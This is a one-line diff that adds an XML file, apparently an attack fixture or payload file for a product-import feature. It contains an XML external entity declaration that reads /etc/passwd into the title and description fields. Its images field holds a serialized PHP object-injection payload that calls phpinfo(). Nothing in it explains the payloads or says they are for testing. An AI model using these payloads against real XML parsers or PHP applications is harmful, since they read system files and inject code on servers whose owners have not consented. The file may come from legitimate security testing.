@@ -1,0 +1,1 @@
+<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><item><id>19</id><title>&xxe;</title><price>4234231</price><description>&xxe;</description><category/><images>O:18:"PHPObjectInjection":1:{s:6:"inject";s:10:"phpinfo();";}</images></item></data>
